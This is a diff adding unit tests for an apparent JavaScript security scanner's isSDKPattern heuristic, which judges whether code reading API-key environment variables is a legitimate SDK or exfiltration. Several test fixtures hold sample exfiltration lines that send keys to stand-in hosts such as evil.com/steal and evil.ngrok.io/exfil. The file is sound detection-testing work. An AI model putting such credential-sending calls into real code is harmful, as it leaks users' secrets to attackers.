@@ -876,6 +876,77 @@ fetch('https://evil.com/exfil', { body: h });`;
       assert(t.severity === 'HIGH', `fingerprint_read + distant sink should stay HIGH, got ${t.severity}`);
     } finally { cleanupTemp(tmp); }
   });
+  // ==========================================================================
+  // R2: isSDKPattern() credential suffix heuristic
+  // ==========================================================================
+
+  test('R2: isSDKPattern — credential suffix + brand match + mixed domains → SDK', () => {
+    const { isSDKPattern } = require('../../src/intent-graph.js');
+    const code = `
+const token = process.env.KREA_API_KEY;
+fetch('https://api.krea.ai/generate', { headers: { Authorization: token } });
+fetch('https://cdn.cloudfront.net/model.bin');
+`;
+    assert(isSDKPattern('KREA_API_KEY', code) === true,
+      'KREA_API_KEY with api.krea.ai + cdn.cloudfront.net should be SDK (R2 relaxed)');
+  });
+
+  test('R2: isSDKPattern — no credential suffix + mixed domains → NOT SDK', () => {
+    const { isSDKPattern } = require('../../src/intent-graph.js');
+    const code = `
+const url = process.env.KREA_URL;
+fetch('https://api.krea.ai/generate');
+fetch('https://cdn.cloudfront.net/model.bin');
+`;
+    assert(isSDKPattern('KREA_URL', code) === false,
+      'KREA_URL (no credential suffix) with mixed domains should NOT be SDK');
+  });
+
+  test('R2: isSDKPattern — credential suffix but brand matches no domain → NOT SDK', () => {
+    const { isSDKPattern } = require('../../src/intent-graph.js');
+    const code = `
+const key = process.env.ACME_API_KEY;
+fetch('https://evil.com/steal', { body: key });
+`;
+    assert(isSDKPattern('ACME_API_KEY', code) === false,
+      'ACME_API_KEY with evil.com (no brand match) should NOT be SDK');
+  });
+
+  test('R2: isSDKPattern — credential suffix with all-match still works (strict path)', () => {
+    const { isSDKPattern } = require('../../src/intent-graph.js');
+    const code = `
+const key = process.env.KREA_API_KEY;
+fetch('https://api.krea.ai/generate');
+fetch('https://cdn.krea.ai/assets');
+`;
+    assert(isSDKPattern('KREA_API_KEY', code) === true,
+      'KREA_API_KEY with all krea.ai domains should be SDK (strict path)');
+  });
+
+  test('R2: isSDKPattern — credential suffix + suspicious domain → NOT SDK', () => {
+    const { isSDKPattern } = require('../../src/intent-graph.js');
+    const code = `
+const key = process.env.KREA_API_KEY;
+fetch('https://api.krea.ai/generate');
+fetch('https://evil.ngrok.io/exfil');
+`;
+    assert(isSDKPattern('KREA_API_KEY', code) === false,
+      'KREA_API_KEY with ngrok domain should NOT be SDK (suspicious domain check)');
+  });
+
+  test('R2: isSDKPattern — _SECRET suffix triggers relaxed check (heuristic path)', () => {
+    const { isSDKPattern } = require('../../src/intent-graph.js');
+    // Use non-curated brand (KREA) to test heuristic R2 path.
+    // Curated brands (STRIPE, AWS, etc.) use strict all-domains-match.
+    const code = `
+const s = process.env.KREA_SECRET;
+fetch('https://api.krea.ai/v1/generate', { headers: { Authorization: s } });
+fetch('https://cdn.cloudfront.net/models/v2.bin');
+fetch('https://logs.datadoghq.com/track');
+`;
+    assert(isSDKPattern('KREA_SECRET', code) === true,
+      'KREA_SECRET with krea.ai + CDN + logging should be SDK (R2 relaxed)');
+  });
 }
 
 module.exports = { runDataflowTests };
